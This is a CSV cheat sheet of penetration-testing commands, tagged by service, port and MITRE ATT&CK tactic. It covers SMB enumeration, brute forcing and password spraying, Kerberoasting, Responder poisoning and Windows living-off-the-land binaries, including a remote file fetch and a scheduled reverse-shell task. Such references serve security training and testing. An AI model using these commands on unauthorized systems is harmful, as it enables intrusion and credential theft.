Tools,Service,Port,Syntax & Description,Tags,MITRE ATT&CK
SMBMap,SMB,445,"smbmap -H {IP Address}
smbmap -H {IP Address} -r {directory} - (R for Recursive, recursively search directories)
smbmap -H {IP Address}  - -download “directory\file.extension” downloads file
smbmap -H {IP Address} - -upload {filename} “directory\file.extension” uploads file to directory","Enumeration, Tool","Discovery, Initial Access"
RPCClient,SMB,445,"rpcclient -U’%’ {IP Address}
rpcclient -U “” -N {IP Address} - NULL Sessions
querydominfo - query domain information
getdompwinfo - query password info
enumdomusers - enumerate domain users
enumdomgroups - enumerate domain groups
createdomuser username - creates domain user
setuserinfo2 username 24 ‘newpassword’ - sets password for user
chgpasswd3 username oldpass newpass - changes password for user
getusrdompwinfo {RID} - sets password info per user
","Enumeration, Tool","Discovery, Initial Access, Lateral Movement"
SMBClient,SMB,445,"smbclient -N -L //{IP Address} - Null Session
smbclient //<FQDN/IP>/<share> Connect to specific SMB Share","Enumeration, Tool","Discovery, Initial Access"
Crackmapexec,SMB,445,"crackmapexec smb <FQDN/IP> - -shares -u ‘ ‘ -p ‘ ‘ - Enumerating SMB shares using null session auth
crackmapexec smb {IP Address} -u /<insert username file> -p <insert password or password file> - password spray
cme smb {targetIP} --shares -u '' -p '' -list smb shares","Enumeration, Tool","Credential Access, Discovery, Initial Access, Lateral Movement, Privilege Escalation"
Hydra,SMB,445,hydra -L <location of username list> -P <passwordlist> -vV {IP Address} smb,"Brute Force, No Password, No Username, Tool","Credential Access, Lateral Movement"
Impacket,SMB,445,"impacket-smbexec “./username:pass”@{IP Address} - Login with clear text pw
impacket-samrdump {targetIP} - bruteforce RID’s
impacket-mssqlclient {user}@{targetIP} -windows-auth - connect to a MSSQL instance (Creds needed)
impacket-wmiexec {user}:{pass}@{targetIP} ""{hostname}"" - connect to WMI service (Creds needed)
samrdump.py {target ip/FQDN} - Username enumeration for SMB","Log in, Tool","Credential Access, Lateral Movement"
Hydra,FTP,20 / 21,"hydra -l <username> -P <password list> ftp://<ipaddress> 
hydra -L <username list> -P <password list> {IP Address} ftp","Brute Force, No Password, No Username, Tool","Credential Access, Initial Access"
Crowbar,RDP,3389,"./crowbar.py -b rdp -u DOMAIN\\username -c <password> -s {subnet}
./crowbar.py -b rdp -s {subnet} -u {username} -c {password}
./crowbar.py -b rdp -s {subnet} -U {username list} -C {password list}","Brute Force, Log in, No Password, No Username, Tool","Initial Access, Lateral Movement, Privilege Escalation"
Hydra,RDP,3389,"hydra -t 1 -V -f -l <username> -P <password file> rdp://{IP Address}
hydra -t 1 -V -f -l <username> -P <password file> {IP Address} rdp","Brute Force, No Password, No Username, Tool",Credential Access
Remmina,RDP,3389, remmina,"Log in, Tool",Lateral Movement
Xrdp,RDP,3389,,"Log in, Tool",Lateral Movement
Dig,DNS,53,"dig {ip address / domain name}
dig ns {domain@nameserver} - NS Request
dig any {domain@nameserver} - ANY request
dig axfr {domain@nameserver} - AXFR request","Enumeration, Tool",Discovery
Subfinder,DNS,53,subfinder -d {domain} -v,"Enumeration, Tool",Discovery
Subbrute,DNS,53,./subbrute.py {domain},"Brute Force, Enumeration, Tool",Discovery
Dig,Email Services,110 (POP3) 143 (IMAP),"dig {recordType} {domain} @{targetIp} - Query specific record
dig ANY {domain} @{targetIp} - Query all records
dig axfr {domain} @{targetIP} - Attempt zone transfer","Enumeration, Tool",Discovery
O365Spray,Email Services,110 (POP3) 143 (IMAP),"O365spray - -validate - -domain {domain} - validate domain exists
o365spray - -enum -U {file} - -domain {domain} - username enumeration
o365spray - -spray -U {file} -P {file} - -count2 - -lockout 5 - -domain {domain} ","Brute Force, Enumeration, No Password, No Username, Tool","Credential Access, Discovery, Initial Access"
Hydra,Email Services,110 (POP3) 143 (IMAP),,"Brute Force, No Password, No Username, Tool","Credential Access, Lateral Movement"
plink.exe,SSH,22,,Tool,
sshuttle,SSH,22,,Tool,
Hydra,SSH,22,"hydra -t 1 -V -f -l <username> -P <password file> ssh://{IP Address}
hydra -t 1 -V -f -l <username> -P <password file> {IP Address} ssh","Brute Force, No Password, No Username, Tool","Discovery, Initial Access"
john2ssh,SSH,22,,"SSH Key, Tool",
Gobuster,"HTTP, HTTPS",80/443,"gobuster dir -u http://{targetIP}/ -w /usr/share/dirb/wordlists/big.txt - Directory discovery
gobuster dns -d {exampleDomain.com} -w /usr/sahre/seclists/discovery/dns/namelists.txt - Subdomain Discovery",Tool,
Dirbuster,"HTTP, HTTPS",80/443,,Tool,
Burpsuite,"HTTP, HTTPS",80/443,,Tool,
Hydra,"HTTP, HTTPS",80/443,,"Brute Force, No Password, No Username, Tool","Credential Access, Lateral Movement"
Ldapsearch,LDAP,389,"ldapsearch -LLL -x -H ldap://{domain} -b ‘ ‘ -s base ‘(objectclass=\*)’
ldapsearch -h {domain} -D ‘[user]@[domain]’ -w [password] -b ‘dc=[domainpt1],dc=[domain,pt2]’","Enumeration, No Password, No Username, Tool","Credential Access, Discovery, Privilege Escalation"
Windapsearch,LDAP,389,,Tool,
SNMPwalk,SNMP,161,,Tool,
onesixtyone,SNMP,161,,Tool,
braa,SNMP,161,,Tool,
Kerbrute,Kerberos,88,"kerbrute passwordspray -d {domain} <userfile> <password> - if username is unknown
kerbrute bruteuser -d {domain} <passwordlist> <username> - if username is known
kerbrute userenum -d {domain} <userfile> - username enumeration","Enumeration, Kerberos, No Password, No Username, Tool, Username, Windows","Credential Access, Discovery, Privilege Escalation"
Rubeus,Kerberos,88,"Rubeus.exe /users:usernames.txt /passwords:passwords.txt /domain:{domain} /outfile:found_passwords.txt
Rubeus.exe kerberoast /outfile:hashes.txt ","Enumeration, Kerberos, No Password, No Username, Tool, Windows","Credential Access, Discovery, Privilege Escalation"
Hashcat,Cracking,,"hashcat -m 18200 user.,kerb {passwordlist}","Cracking, Kerberos, TGT, Tool, Windows",Privilege Escalation
evil-winrm,WMI,,evil-winrm -i {ip} -u {username} -p {password},Tool,
Responder,"NTLM, SMB",,Responder -I eth0 -A,"Exploitation, No Password, No Username, Tool","Credential Access, Discovery, Initial Access"
AddinUtil.exe,LOLBAS,,"C:\Windows\Microsoft.NET\Framework\v4.0.30319\AddinUtil.exe -AddinRoot: .
Executes “Addins.Store” which can be placed in any folder containing any command.","LOLBAS, LOTL (Living Off The Land)",Defense Evasion
AppInstaller.exe,LOLBAS,,"start ms-appinstaller:///?source=https://X[.]com/random/file/here
this will install files from the given path","LOLBAS, LOTL (Living Off The Land)",Ingress Tool Transfer
Aspnet_Complier.exe,LOLBAS,,"C:\Windows\Microsoft.NET\Framework\v4.0.30319\aspnet_compiler.exe -v none -p C:\users\cpl.internal\desktop\asptest -f c:\users\cpl.internal\desktop\asptest\none -u 
Execute C# code with the build provider and proper folder structure","LOLBAS, LOTL (Living Off The Land)",Defense Evasion
At.exe,LOLBAS,,"C:\Windows\System32\at.exe 9:00 /interactive /every:m,t,w,th,f,s,su C:\Windows\System32\revshell.exe 
Create reoccuring tasks","LOLBAS, LOTL (Living Off The Land)","Execution, Persistence, Privilege Escalation"
